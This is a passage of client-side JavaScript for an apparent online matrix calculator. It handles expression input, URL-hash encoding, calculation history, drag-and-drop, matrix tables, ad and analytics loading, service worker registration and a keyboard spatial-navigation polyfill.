    event.target.style.width = ch(Math.max(38, event.target.value.length + 2 + 2) + "ch"); // + 2 as it has a list
  }, false);

  if (input.value === input.getAttribute("value")) { // autofill
    //input.disabled = true;
    var value = keyStorage.getItem("expression");
    if (value != undefined && value !== "") {
      //input.value = value;
      updateInputValue(input, value);
    }
    input.addEventListener("input", function (event) {
      var input = event.target;
      checkInput(input, "");
    }, false);
    checkInput(input, "");
    //input.disabled = false;
  }

  // transformation of multi-line form into single-line form
  input.addEventListener("drop", DnD.onDropOrPaste, false);
  input.addEventListener("paste", DnD.onDropOrPaste, false);
});

var encodeLocationHash = function (hash) {

  //var url = new URL('https://example.com/');
  //url.hash = hash;
  //return hash.slice('#'.length);

  // twitter.com does not support {} in hash, seems
  // comments systems, other software with "auto-link" feature may work not good with some characters ...
  // update: 2021-07-27: *, (, ) - not encoded
  // TODO: ^ - replace by ** - ?
  return encodeURIComponent(hash).replace(/[\!'\.~]/g, function (p) {
                                   return '%' + p.charCodeAt(0).toString(16);
                                 })
                                 // / - 2018-07-09
                                 // &, +, _ - 2020-08-02
                                 .replace(/%26|%2B|%2C|%2F|%3D/g, function (p) {
                                   return decodeURIComponent(p);
                                 });
};

// https://stackoverflow.com/questions/7449588/why-does-decodeuricomponent-lock-up-my-browser
function decodeURIComponentSafe(string) {
  var validPercentEncoding = /(?:%[0-7][0-9A-F]|%(?!C[0-1])[C-D][0-9A-F]%[8-9A-B][0-9A-F]|%(?!E0%[8-9])(?!ED%[A-B])E[0-9A-F](?:%[8-9A-B][0-9A-F]){2}|%(?!F0%8)(?!F4%[9A-B])F[0-4](?:%[8-9A-B][0-9A-F]){3}|[^%])+/gi;
  return string.replace(validPercentEncoding, function (p) {
    return decodeURIComponent(p);
  });
}

var decodeLocationHash = function (hash) {
  // determinant-Gauss%28%7B%7B0,z,y,u%7D,%7Bz,z,u%2By,u%2By%7D,%7Bu%2By,u%2By,z,z%7D,%7Bu,y,z,0%7D%7D%29
  return decodeURIComponentSafe(hash);
};

var lastHash = "";

var onHashChange = function (event) {
  var hash = decodeLocationHash(window.location.hash.slice(1));
  if (lastHash === hash) {
    return;
  }
  lastHash = hash;

  if (document.getElementById(hash) != undefined) {
    return;
  }
  //TODO: (?)
  if (/^hcm\=\d+$/.exec(hash) != undefined) { // || document.getElementById(hash) != undefined
    return;
  }
  if (/^[\-\da-zA-Z]*system_1$/.exec(hash) != undefined) { // || document.getElementById(hash) != undefined
    return;
  }
  if (hash.trim() === "") {
    return;
  }

  var actHistoryId = (actHistoryStorage.actHistoryId += 1);
  var printOptions = {idPrefix: "i" + actHistoryId.toString(), rounding: decimalRounding};
  //TODO: FIX!!!
  RPNProxy.runExpression(hash, undefined, undefined, undefined, printOptions, function (result) {
    var resultError = result.resultError;
    var details = result.details;
    var expressionString = result.expressionString;
    var resultHTML = result.resultHTML;
    var resultMatrix = result.resultMatrix;
    var detailsHTML = result.detailsHTML;
    if (resultError == undefined) {
      var previousItem = actHistoryStorage.getPreviousItem();
      //...
      // TODO: FIX!!! It is wrong to compare HTML here, as "Expression.id()" generates different HTML each time
      if (previousItem == undefined || (previousItem.resultHTML !== resultHTML && previousItem.expressionString !== expressionString)) {
        zInsAct(resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, {isLoading: false, fromHashChange: true});
      }
    } else {
      //if (resultError.message.indexOf("UserError:") === 0) {
        //ignore
      //} else {
        var positionInfo = RPNProxy.getPositionInfo();
        handleError(hash, "location.hash", resultError, positionInfo);
      //}
    }
  });
};

Utils.initialize(".from-cookie", function (element) {

  if ((window.navigator.platform || '').indexOf('Mac') === 0) {
    document.body.classList.add('mac');
  }

  // TODO: insert after the <details> element expansion - ? and calculate - ?
  var examples = document.getElementById("examples");
  if (examples != undefined) {
    var list = examples.querySelectorAll("a");
    for (var i = 0; i < list.length; i += 1) {
      var code = list[i].querySelector("code");
      var s = code.textContent;
      var html = "<math>" + Expression.p(s, {}, {idPrefix: "g", useMatrixContainer: false}) + "</math>";
      var tmp = document.createElement("div");
      tmp.innerHTML = html;
      code.parentNode.insertBefore(tmp.firstElementChild, code);
      code.parentNode.removeChild(code);
    }
  }

  actHistoryStorage.load(function (storedActHistory) {
  Utils.waitI18n(function () {
    var exampleAttribute = element.getAttribute("data-example");
    var needsExample = exampleAttribute != undefined;
    var oldVersion = ActHistoryItem.version;
    if (true) {
      for (var actHistoryId in storedActHistory) {
      if (Object.prototype.hasOwnProperty.call(storedActHistory, actHistoryId)) {
        var storedActHistoryItem = storedActHistory[actHistoryId].item;
        if (storedActHistoryItem != null) {//! some strange issue in Safari

        storedActHistoryItem.resultHTML = storedActHistoryItem.resultHTML;
        storedActHistoryItem.detailsHTML = storedActHistoryItem.detailsHTML;

        zInsAct(storedActHistoryItem.resultHTML,
                storedActHistoryItem.resultMatrix,
                storedActHistoryItem.details,
                storedActHistoryItem.expressionString,
                actHistoryId,
                storedActHistoryItem.detailsHTML,
                {isLoading: true});
        needsExample = false;
        oldVersion = Math.min(oldVersion, storedActHistoryItem.oldVersion);
        if (storedActHistoryItem.expressionString == undefined) {
          oldVersion = -1;
        }
        }
      }
      }
      //if (oldVersion !== ActHistoryItem.version) {
        //..
      //}
      if (storedActHistory.length !== 0) {
        hit({version: "version-" + oldVersion});
      }
    }
    window.addEventListener("hashchange", onHashChange, false);
    onHashChange(undefined);
    needsExample = needsExample && actHistoryStorage.size() === 0;
    if (needsExample) {
      var printOptions = {idPrefix: "g"};
      RPNProxy.runExpression("{{5,8,-4},{6,9,-5},{4,7,-2}}*{{2},{-3},{1}}", undefined, undefined, undefined, printOptions, function (result) {
        if (result.resultError == undefined) {
          // TODO: isLoading or not isLoading - ?
          var actHistoryId = "#" + result.resultMatrix;
          zInsAct(result.resultHTML, result.resultMatrix, result.details, result.expressionString, actHistoryId, result.detailsHTML, {isLoading: true});
          //! Note:
          //! No need to save the example
        } else {
          handleError("", "", result.resultError, {});
        }
      });
    }
  });
  });

  var pathname = window.location.pathname;
  var links = document.querySelector(".menu").querySelectorAll("a");
  for (var i = 0; i < links.length; i += 1) {
    if (links[i].pathname === pathname) {
      links[i].setAttribute('aria-current', 'page');
    }
  }

});

// --------------------------------------------- end ----------------------------------------------

//  Drag and Drop + Copy and Paste

var toggleValidDropTarget = function (force) {
  //document.body.classList.toggle("drop-target", force);
  var dropzones = document.querySelectorAll(".matrix-table");
  for (var i = 0; i < dropzones.length; i += 1) {
    dropzones[i].classList.toggle("valid-drop-target", force);
  }
  var expressionInput = document.getElementById("expression");
  if (expressionInput != undefined) {
    expressionInput.classList.toggle("valid-drop-target", force);
  }
  var addTableButton = document.querySelector(".add-table");
  if (addTableButton != null) {
    addTableButton.classList.toggle("valid-drop-target", force);
  }
};
DnD.hasInterestingData = function (dataTransfer) {
  // TODO: types is null in Safari 10
  // types returns null in IE 11
  var types = dataTransfer.types || ['text/plain'];
  for (var i = 0; i < types.length; i += 1) {
    var type = types[i];
    if (type === "text/plain" ||
        type === "application/mathml-presentation+xml" ||
        (typeof TextDetector !== "undefined" && type === "Files")) {//TODO: /^image\//.test(event.dataTransfer.items[i].type)
      return true;
    }
  }
  return false;
};
var onDragOverOrDragEnd = function (event) {
  if (!DnD.hasInterestingData(event.dataTransfer)) {
    return;
  }
  var key = "data-drop-target-timeout";
  var a = Number(document.body.getAttribute(key) || 0) || 0;
  if (a !== 0) {
    window.clearTimeout(a);
  } else {
    toggleValidDropTarget(true);
  }
  a = window.setTimeout(function () {
    toggleValidDropTarget(false);
    document.body.setAttribute(key, "0");
  }, event.type === "dragend" ? 0 : 600);
  document.body.setAttribute(key, a.toString());
};

document.addEventListener("dragover", onDragOverOrDragEnd, false);
document.addEventListener("dragend", onDragOverOrDragEnd, false);

//

var arrowWithLabelInitialize = function (arrowWithLabel) {
  var arrow = arrowWithLabel.querySelector(".arrow");
  var table = arrowWithLabel.previousElementSibling.querySelector("mtable");
  var start = Number(arrowWithLabel.getAttribute("data-start"));
  var end = Number(arrowWithLabel.getAttribute("data-end"));
  var n = 0;
  var row = table.firstElementChild;
  var startRow = undefined;
  var endRow = undefined;
  while (row != undefined) {
    if (n === start) {
      startRow = row;
    }
    if (n === end) {
      endRow = row;
    }
    n += 1;
    row = row.nextElementSibling;
  }
  var startRowRect = startRow.getBoundingClientRect();
  var endRowRect = endRow.getBoundingClientRect();
  var tableRect = table.getBoundingClientRect();
  if (end < start) {
    var tmp = endRowRect;
    endRowRect = startRowRect;
    startRowRect = tmp;
  }
  var arrowHeight = ((endRowRect.top + endRowRect.bottom) / 2 - (startRowRect.top + startRowRect.bottom) / 2);
  var arrowWithLabelVerticalAlign = ((tableRect.top + tableRect.bottom) / 2 - (startRowRect.top + endRowRect.bottom) / 2);
  window.requestAnimationFrame(function () {
    arrow.style.height = arrowHeight.toString() + "px";
    arrow.style.top = "50%";
    arrow.style.marginTop = (-arrowHeight / 2).toString() + "px";
    arrowWithLabel.style.verticalAlign = arrowWithLabelVerticalAlign.toString() + "px";
  });
};

document.addEventListener("custom-paint", function (event) {
  if (event.target.getAttribute("data-custom-paint") === "arrow-with-label") {
    arrowWithLabelInitialize(event.target);
  }
}, false);

if ("navigationMode" in window.history) {
  window.history.navigationMode = "fast"; // - Opera Presto
}

Utils.initialize(".ads-container", function (adsContainer) {

  var isConnectionOK = function () {
    // doNotTrack - 8%
    // "slow-2g" + "2g" - 2.5%
    // saveData - 18%
    return window.location.protocol !== "file:" &&
           window.location.hostname !== "127.0.0.1" &&
           window.navigator.doNotTrack !== "1" &&
           isConnectionFast();
  };

  if (isConnectionOK() && false) {
    window.setTimeout(function () {
      (window["yandex_metrika_callbacks"] = window["yandex_metrika_callbacks"] || []).push(function() {
        try {
          yaCounter = new Ya.Metrika({
            id: 29787732,
            clickmap: true,
            trackLinks: true,
            accurateTrackBounce: true,
            trackHash: true,
            webvisor: false,
            params: {}
          });
          window.yaCounter29787732 = yaCounter;
          if (yaCounter != undefined) {
            requestIdleCallback("sendHits", sendHits, 1000);
          }
        } catch (error) {
          console.log(error);
        }
      });
      Utils.$import("https://mc.yandex.ru/metrika/watch.js");
    }, 0);
  } else {
    hitQueue = undefined;
  }

  var element = adsContainer.querySelector(".adsbygoogle-container");
  var toggleAdsButton = adsContainer.querySelector(".toggle-ads-button");
  if (toggleAdsButton == null) { // TODO: remove
    toggleAdsButton = document.createElement("div");
    toggleAdsButton.appendChild(document.createElement("div"));
  }

  // "ar bg gl zh mk vi tr".indexOf(document.documentElement.lang) === -1 &&
  var browserIsOK = isConnectionOK() &&
                    window.opera == undefined; // loading indicator in Opera
  if (document.documentElement.lang === 'ru') {
    browserIsOK = false;
  }
  var showAds = false;
  var mediaIsOK = false;
  var prefersReducedMotion = false;

  var isInserted = false;
  var loadAds = function () {
    // https://stackoverflow.com/a/56248553
    function insertHTML(html, dest, append){
        // if no append is requested, clear the target element
        if(!append) dest.innerHTML = '';
        // create a temporary container and insert provided HTML code
        var container = document.createElement('div');
        container.innerHTML = html;
        // cache a reference to all the scripts in the container
        var scripts = container.querySelectorAll('script');
        // get all child elements and clone them in the target element
        var nodes = container.childNodes;
        for( var i=0; i< nodes.length; i++) dest.appendChild( nodes[i].cloneNode(true) );
        // force the found scripts to execute...
        for( var i=0; i< scripts.length; i++){
            var script = document.createElement('script');
            script.type = scripts[i].type || 'text/javascript';
            if( scripts[i].hasAttribute('src') ) script.src = scripts[i].src;
            script.innerHTML = scripts[i].innerHTML;
            document.head.appendChild(script);
            document.head.removeChild(script);
        }
        // done!
        return true;
    }
    if (browserIsOK && mediaIsOK && !prefersReducedMotion && showAds && window.fetch != null) {
      if (!isInserted) {
        isInserted = true;
        fetch(Utils.ROOT_PATH + 'ads.json').then(function (response) {
          return response.json();
        }).then(function (ads) {
          var x = undefined;
          var lang = document.documentElement.lang;
          var now = Date.now();
          for (var i = 0; i < ads.length; i += 1) {
            var j = Math.floor(Math.random() * ads.length);
            var item = ads[i];
            ads[i] = ads[j];
            ads[j] = item;
          }
          for (var i = 0; i < ads.length; i += 1) {
            var item = ads[i];
            if ((lang === item.lang || item.lang === "*") && Math.random() < item.probability && now < Date.parse(item.endTime)) {
              x = item;
            }
          }
          if (x != undefined) {
            if (x.videoId !== "") {
              element.innerHTML = "<div id=\"player\"></div>";
              window.onYouTubeIframeAPIReady = function () {
                var done = false;
                var player = new YT.Player("player", {
                  height: "200",
                  width: "200",
                  videoId: x.videoId,
                  events: {
                    onStateChange: function (event) {
                      if (event.data >= 0 && !done) {
                        hit({click: "youtube-click"});
                        done = true;
                      }
                    }
                  }
                });
              };
              Utils.$import("https://www.youtube.com/iframe_api");
            } else if (x.html !== "") {
              //element.innerHTML = x.html;
              insertHTML(x.html, x.placement === "big-ads" ? document.getElementById("big-ads") : element);
            }
          } else {
            if (Date.now() > Date.parse("2021-12-31T23:59:59.999Z")) {
            (window.adsbygoogle = window.adsbygoogle || []).push({});
            Utils.$import("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2322099551790862");
            } else {
              toggleAdsButton.hidden = true;//!?
            }
          }
        });
      }
    }
    toggleAdsButton.hidden = !browserIsOK || !mediaIsOK || prefersReducedMotion;
  };

  if (browserIsOK) {
    window.requestAnimationFrame(function () {
      var updateUI = function () {
        toggleAdsButton.firstElementChild.hidden = !showAds;
        toggleAdsButton.lastElementChild.hidden = showAds;
        element.hidden = !showAds;
      };

      var value = keyStorage.getItem("show-ads");
      showAds = value == undefined || value === "true";
      updateUI();
      loadAds();
      toggleAdsButton.onclick = function () {
        showAds = !showAds;
        keyStorage.setItem("show-ads", showAds ? "true" : "false");
        updateUI();
        loadAds();
        hit({click: "show-ads-" + showAds});
      };

      var mediaQueryList = window.matchMedia("screen and (max-width: 800px)");  // see style.css
      var checkMedia = function () {
        if (!mediaQueryList.matches) {
          mediaQueryList.removeListener(checkMedia);
          mediaIsOK = true;
          loadAds();
        }
      };
      mediaQueryList.addListener(checkMedia);
      checkMedia();
    });
  } else {
    toggleAdsButton.hidden = true;
  }

  var elementAnimate = Element.prototype.animate;

  //TODO: move
    window.setTimeout(function () {
      var mediaQueryList = window.matchMedia("(prefers-reduced-motion)");
      var checkMedia = function () {
        if (mediaQueryList.matches) {
          prefersReducedMotion = true;
          Element.prototype.animate = undefined;
          hit({click: "prefers-reduced-motion"});
        } else {
          prefersReducedMotion = false;
          Element.prototype.animate = elementAnimate;
        }
        loadAds();
      };
      mediaQueryList.addListener(checkMedia);
      checkMedia();
    }, 0);

});

if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1") {
  var useAppCache = function () {
    document.addEventListener("DOMContentLoaded", function (event) {
      // https://www.youtube.com/watch?v=IgckqIjvR9U&t=1005s
      var iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = "load-appcache.html";
      document.body.appendChild(iframe);
    }, {once: true});
  };
  if (("serviceWorker" in window.navigator)) {
    var serviceWorker = undefined;
    try {
      serviceWorker = window.navigator.serviceWorker;
    } catch (error) {
      if (error.name !== "SecurityError") {
        throw error;
      }
    }
    if (serviceWorker != undefined) {
      var promise = serviceWorker.register(Utils.ROOT_PATH + "nocache.php?p=" + decodeURIComponent(location.pathname.replaceAll('/', '') + '/sw.js'), {scope: "./"});
      if (promise.then != undefined) {
        promise.then(function (registration) {
          console.log("ServiceWorker registration succeeded:", registration);
          //TODO:
          // reload the page if the user has not interacted with the page yet and the major version is bigger (?)
          //registration.onupdatefound = function () {
          //  var installingWorker = registration.installing;
          //  installingWorker.onstatechange = function (event) {
          //    if (installingWorker.state === "activated") {
          //      window.location.reload();
          //    }
          //  };
          //};
        })["catch"](function (error) {
          useAppCache();
          console.log("ServiceWorker registration failed:", error);
        });
      }
    } else {
      useAppCache();
    }
  } else {
    useAppCache();
  }
}

window.addEventListener("beforeinstallprompt", function (event) {
  event.preventDefault(); // most of users do not accept it
  //if (event.userChoice != undefined) {
  //  event.userChoice.then(function (choiceResult) {
  //    hit({beforeinstallprompt: choiceResult.outcome});
  //  });
  //}
  hit({beforeinstallprompt: "show"});

  var installButton = document.getElementById('a2hs-button');
  if (installButton != null) {
    installButton.onclick = function (mouseEvent) {
      event.prompt();
    };
    installButton.hidden = false;
  }
}, false);

document.addEventListener("DOMContentLoaded", function (event) {
  if (window.navigator.share != undefined) {
    var shareButton = document.getElementById('share-button');
    if (shareButton != null) {
      shareButton.onclick = function (event) {
        window.navigator.share({
          title: decodeURIComponent(shareButton.getAttribute("data-text")),
          url: decodeURIComponent(shareButton.getAttribute("data-url"))
        });
      };
      shareButton.hidden = false;
    }
  }
}, {once: true});

Utils.on("click", ".share-item-button", function (event) {
  var actHistoryId = this.getAttribute("data-act-history-id");
  var item = actHistoryStorage.getItem(Number(actHistoryId));
  window.navigator.share({
    url: "#" + encodeLocationHash(item.expressionString)
  });
});

Utils.initialize(".more-button", function (button) {
  var container = button.previousElementSibling;
  button.onclick = function () {
    container.hidden = !container.hidden;
    button.setAttribute("aria-expanded", container.hidden ? "true" : "false");
  };
});

//! 2018-03-20
var onMatrixTable = function () {
  //!
  var matrixMenu = document.getElementById("matrix-menu");
  if (matrixMenu != undefined) {
    matrixMenu.parentNode.removeChild(matrixMenu);
  }
  var matrixMenuDialog = document.getElementById("matrix-menu-dialog");
  if (matrixMenuDialog != undefined) {
    matrixMenuDialog.parentNode.removeChild(matrixMenuDialog);
  }
};

var addTableTemplate = document.createElement('div');
addTableTemplate.innerHTML = '<div class="tdmatrix">' +
                             '<fieldset>' +
                             '<legend align="center"><span></span><button type="button" class="remove-table" data-id="X" title="">âœ—</button></legend>' +
                             '<div class="insert-table" data-id="X" data-sizes="3x3" data-type="simple"></div>' +
                             '</fieldset>' +
                             '</div>';

var storedTables = {};

function addTable(id) {
  var tableNode = document.querySelector('.matrix-table[data-id="' + id + '"]');
  var tdNode = tableNode != null ? tableNode.closest('.tdmatrix') : null;
  if (tdNode != null) {
    tdNode.style.display = '';
    MatrixTables[id] = storedTables[id];
    MatrixTables[id]._resizeTable(MatrixTables[id].initRows, MatrixTables[id].initCols);
  } else {
    var newNode = addTableTemplate.firstElementChild.cloneNode(true);
    newNode.querySelector("legend").querySelector("span").textContent = i18n.index.matrix + ' ' + id + i18n.colonSpacing + ': ';
    newNode.querySelector(".remove-table").setAttribute("data-id", id);
    newNode.querySelector(".remove-table").title = i18n.buttons.removeTable;
    newNode.querySelector(".insert-table").setAttribute("data-id", id);
    document.querySelector(".main").appendChild(newNode);
    Utils.check(newNode);
  }
  onMatrixTable();
}

function removeTable(id) {
  storedTables[id] = MatrixTables[id];
  MatrixTables[id]._resizeTable(-1 / 0, -1 / 0); //!new 2020-03-22 (To save hidden <input> elements)
  delete MatrixTables[id];
  var tdNode = document.querySelector('.matrix-table[data-id="' + id + '"]').closest('.tdmatrix');
  if (tdNode != null) {
    //tdNode.parentNode.removeChild(tdNode);
    tdNode.style.display = 'none';
  }
  //TODO: update history state when hiding (?)
  //TODO: restore from the history state the table on back button click
  //TODO: set focus to the previous element (?)
  onMatrixTable();
}

function getNextTableId() {
  var id = undefined;
  for (var c = "A"; c <= "Z"; c = String.fromCharCode(c.charCodeAt(0) + 1)) {
    if (id == undefined && MatrixTables[c] == undefined) {
      id = c;
    }
  }
  return id;
}

//button
Utils.initialize(".add-table", function (element) {
  element.addEventListener("click", function (event) {
  hit({click: "add-table"});
  var id = getNextTableId();
  if (id == undefined) {
    throw new TypeError("Not implemented!");
  }
  addTable(id);
  }, false);

  //!new 2019-01-06
  // Note: "paste" event is not working in Chrome 71?
  DnD.initializeDropZone(element);

  Utils.waitI18n(function () {//TODO: ?
  var historyState = window.history.state;
  if (historyState != null) {
    for (var key in historyState) {
      if (Object.prototype.hasOwnProperty.call(historyState, key)) {
        if (/^[A-Z]1$/.test(key)) {//TODO: ?
          var id = key.slice(0, -1);
          if (MatrixTables[id] == undefined) {
            addTable(id);
          }
        }
      }
    }
  }
  }, 0);
});
//button
Utils.on("click", ".remove-table", function (event) {
  hit({click: "remove-table"});
  var id = event.target.getAttribute("data-id");
  removeTable(id);
});

  function makeContent(variableName) {
    return MatrixTableBase.makeContent(variableName);
  }

Utils.initialize(".editable-on-click", function (element) {
  element.innerHTML = '<button type="button"></button><input type="text" pattern="[a-z](?:_\d)?" autocapitalize="off" autocomplete="off" spellcheck="false" enterkeyhint="done" hidden />';
  var button = element.querySelector("button");
  var input = element.querySelector("input");
  input.value = element.getAttribute('data-value');
  button.innerHTML = '<math>' + makeContent(element.getAttribute('data-value')) + '</math>';
  // Firefox will not insert a new character into the <input> if to switch during "keypress"
  element.addEventListener("keydown", function (event) {
    if (!event.defaultPrevented && !event.ctrlKey && !event.shiftKey && !event.metaKey && !event.altKey) {
      var charCode = String.fromCharCode(event.keyCode).toLowerCase().charCodeAt(0);
      if (charCode >= "a".charCodeAt(0) && charCode <= "z".charCodeAt(0)) {
        if (!button.hidden) {
          button.click();
        }
      }
    }
  }, false);
  function updateValue() {
    var value = input.value.trim();
    element.setAttribute("data-value", value);
    button.innerHTML = '<math>' + makeContent(value) + '</math>';
    element.dispatchEvent(new Event('change-value'));
  }
  element.addEventListener("click", function (event) {
    if (!event.defaultPrevented) {
      event.preventDefault();
      button.hidden = true;
      input.hidden = false;
      input.focus();
      input.select();
      input.addEventListener("blur", function (event) {
        var value = input.value.trim();
        if (element.getAttribute("data-value") !== value && value !== "") {
          updateValue();
        }
        button.hidden = false;
        input.hidden = true;
      }, false);
      input.addEventListener("keydown", function (event) {
        var DOM_VK_RETURN = 13;
        var DOM_VK_ESCAPE = 27;
        if (event.keyCode === DOM_VK_ESCAPE) {
          updateInputValue(input, element.getAttribute("data-value"));
          event.preventDefault();
          button.hidden = false;
          button.focus();
          input.hidden = true;
        }
        if (event.keyCode === DOM_VK_RETURN) {
          if (input.value.trim() === "") {
            updateInputValue(input, element.getAttribute("data-value"));
          }
          event.preventDefault();
          updateValue();
          button.hidden = false;
          button.focus();
          input.hidden = true;
        }
      }, false);
      input.addEventListener("input", function (event) {
        input.style.width = ch((input.value.length + 2) + "ch");
      }, false);
    }
  }, false);
});

}());


// based on https://github.com/WICG/spatial-navigation/blob/main/polyfill/spatial-navigation-polyfill.js

/*
  option.mode = 'all'; //!!!TODO: ?
  if (element.tagName.toLowerCase() === 'iframe') {
    return false;
  }
  // https://github.com/WICG/spatial-navigation/pull/228/files
  window.__spatialNavigation__.keyMode = "SHIFTARROW";
*/

if (!('navigate' in window)) {
  var isVisible = function (element) {
    return element.checkVisibility();
  };
  var directions = {
    37: 'left',
    38: 'top',
    39: 'right',
    40: 'bottom'
  };
  var exitPoint = function (rect, direction) {
    return {
      x: direction === 'left' || direction === 'right' ? rect[direction] : (rect.left + rect.right) / 2,
      y: direction === 'top' || direction === 'bottom' ? rect[direction] : (rect.top + rect.bottom) / 2
    };
  };
  var distance = function(to, from, f) {
    return Math.sqrt(Math.pow((to.x - from.x) * (f ? 2 : 1), 2) + Math.pow((to.y - from.y) * (!f ? 2 : 1), 2));
  };
  var distance1 = function (fromRect, toRect, direction) {
    var f = direction === 'bottom' || direction === 'top';
    var P1 = exitPoint(fromRect, direction);
    var P2 = {
      x: Math.min(Math.max(P1.x, toRect.left), toRect.right),
      y: Math.min(Math.max(P1.y, toRect.top), toRect.bottom)
    };
    return distance(P1, P2, f);
  };
  var handlingEditableElementSmall = function (input, direction) {
    // input.selectionStart == null && input.selectionEnd == null for <input type="number" />
    var tagName = input.tagName.toLowerCase();
    return (tagName !== 'input' && tagName !== 'textarea' && tagName !== 'custom-input') ||
           (input.selectionStart === input.selectionEnd && (input.selectionStart == null || input.selectionStart === (direction === 'left' || direction === 'up' ? 0 : input.value.length)));
  };

  var canMove = function (direction) {
    // The method is based on the Selection#modify
    var selection = window.getSelection();
    var compareCaretPositons = function (node1, offset1, node2, offset2) {
      var tmpRange1 = document.createRange();
      tmpRange1.setStart(node1, offset1);
      var tmpRange2 = document.createRange();
      tmpRange2.setStart(node2, offset2);
      return tmpRange1.compareBoundaryPoints(Range.START_TO_START, tmpRange2);
    };
    var anchorNode = selection.anchorNode;
    var anchorOffset = selection.anchorOffset;
    var focusNode = selection.focusNode;
    var focusOffset = selection.focusOffset;
    var forward = compareCaretPositons(anchorNode, anchorOffset, focusNode, focusOffset) < 0;
    var node = null;
    var offset = 0;
    if (direction === 'backward') {
      node = forward ? anchorNode : focusNode;
      offset = forward ? anchorOffset : focusOffset;
    }
    if (direction === 'forward') {
      node = forward ? focusNode : anchorNode;
      offset = forward ? focusOffset : anchorOffset;
    }
    selection.setBaseAndExtent(node, offset, node, offset);
    selection.modify('move', direction, 'character');
    var result = selection.anchorNode !== node ||
                   selection.anchorOffset !== offset ||
                   selection.focusNode !== node ||
                   selection.focusOffset !== offset;
    selection.setBaseAndExtent(anchorNode, anchorOffset, focusNode, focusOffset);
    return result;
  };

  document.addEventListener('keydown', function(event) {
    if (!event.defaultPrevented && event.shiftKey && !event.ctrlKey && !event.metaKey && !event.altKey) {
      var direction = directions[event.keyCode] || '';
      //TODO: check selectable elements, check "caret browsing state"
      if (direction !== '') {

        //TODO: create issues in the WICG/spatial-navigation :
        if (!window.getSelection().isCollapsed) {
          return;//TODO: issue - ?
        }
        var tagName = event.target.tagName.toLowerCase();
        var isEditable = tagName === 'input' || tagName === 'textarea' || tagName === 'custom-input' || event.target.hasAttribute('contenteditable');
        if (!isEditable && document.activeElement.contains(window.getSelection().focusNode)) {
          if (window.getSelection().type === 'Caret') {
            // no way to detect "Caret Navigation" mode in Chrome :-(, so just use same handlign as for editable elements
            if ((direction === 'left' || direction === 'up' ? canMove('backward') : canMove('forward'))) {
              return; //TODO: issue - ?
            }
          }
        }
        if (!handlingEditableElementSmall(document.activeElement, direction)) {
          return;
        }

        var from = document.activeElement;
        var fromRect = from.getBoundingClientRect();
        var elements = document.getElementsByTagName('*');
        var to = null;
        var toRect = null;
        for (var i = 0; i < elements.length; i++) {
          var element = elements[i];
          if (element.hasAttribute('tabindex') || element.tabIndex !== -1) {
            var rect = element.getBoundingClientRect();
            if (direction === 'bottom' && rect.bottom > fromRect.bottom || direction === 'top' && rect.top < fromRect.top || direction === 'left' && rect.left < fromRect.left || direction === 'right' && rect.right > fromRect.right) {
              if (toRect == null || distance1(fromRect, toRect, direction) > 
                                    distance1(fromRect, rect, direction)) {
                if (isVisible(element)) {
                  to = element;
                  toRect = rect;
                }
              }
            }
          }
        }
        if (to != null) {
          event.preventDefault();
          to.focus();
        }
      }
    }
  }, false);
}